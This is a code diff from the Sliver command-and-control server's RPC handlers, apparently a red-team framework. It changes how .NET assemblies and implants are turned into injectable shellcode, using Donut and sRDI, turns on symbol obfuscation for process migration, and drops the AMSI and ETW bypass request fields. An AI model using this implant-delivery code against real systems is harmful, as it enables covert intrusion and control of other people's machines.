@@ -30,10 +30,9 @@ import (
 	"strings"
 
 	"github.com/Binject/debug/pe"
-
+	"github.com/binject/go-donut/donut"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/assets"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/generate"
@@ -69,7 +68,7 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 			}
 		}
 		config.Format = clientpb.ImplantConfig_SHELLCODE
-		config.ObfuscateSymbols = false
+		config.ObfuscateSymbols = true
 		shellcodePath, err := generate.SliverShellcode(name, config)
 		if err != nil {
 			return nil, err
@@ -103,34 +102,29 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
+	shellcode, err := generate.DonutFromAssembly(
+		req.Assembly,
+		req.IsDLL,
+		req.Arch,
+		req.Arguments,
+		req.Method,
+		req.ClassName,
+		req.AppDomain,
+	)
+	if err != nil {
+		return nil, err
+	}
 
-	// We have to add the hosting DLL to the request before forwarding it to the implant
-	hostingDllPath := path.Join(assets.GetDllDir(), "HostingCLRx64.dll")
-	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
-	if err != nil {
-		return nil, err
-	}
-	offset, err := getExportOffsetFromFile(hostingDllPath, "ReflectiveLoader")
-	if err != nil {
-		return nil, err
-	}
-	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
-		Request:    req.Request,
-		Assembly:   req.Assembly,
-		HostingDll: hostingDllBytes,
-		Arguments:  req.Arguments,
-		Process:    req.Process,
-		AmsiBypass: req.AmsiBypass,
-		EtwBypass:  req.EtwBypass,
-		Offset:     offset,
+	reqData, err := proto.Marshal(&sliverpb.InvokeExecuteAssemblyReq{
+		Data:    shellcode,
+		Process: req.Process,
 	})
 	if err != nil {
 		return nil, err
 	}
-
 	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
 	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
+	respData, err := session.Request(sliverpb.MsgInvokeExecuteAssemblyReq, timeout, reqData)
 	if err != nil {
 		return nil, err
 	}
@@ -140,6 +134,7 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 		return nil, err
 	}
 	return resp, nil
+
 }
 
 // Sideload - Sideload a DLL on the remote system (Windows only)
@@ -220,19 +215,47 @@ func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq
 
 // Utility functions
 func getSliverShellcode(name string) ([]byte, error) {
+	var data []byte
 	build, err := db.ImplantBuildByName(name)
 	if err != nil {
 		return nil, err
 	}
 
-	if build.ImplantConfig.Format == clientpb.ImplantConfig_SHELLCODE {
+	switch build.ImplantConfig.Format {
+	case clientpb.ImplantConfig_SHELLCODE:
 		fileData, err := generate.ImplantFileFromBuild(build)
 		if err != nil {
-			return nil, err
+			return data, err
 		}
-		return fileData, nil
+		data = fileData
+	case clientpb.ImplantConfig_EXECUTABLE:
+		// retrieve EXE from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
+		if err != nil {
+			return data, err
+		}
+		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", donut.DONUT_MODULE_EXE)
+		if err != nil {
+			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
+			return data, err
+		}
+	case clientpb.ImplantConfig_SHARED_LIB:
+		// retrieve DLL from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return data, err
+		}
+		data, err = generate.ShellcodeRDIFromBytes(fileData, "RunSliver", "")
+		if err != nil {
+			return data, err
+		}
+	case clientpb.ImplantConfig_SERVICE:
+		fallthrough
+	default:
+		err = fmt.Errorf("no existing shellcode found")
 	}
-	return nil, fmt.Errorf("no existing shellcode found")
+	return data, err
 }
 
 // ExportDirectory - stores the Export data
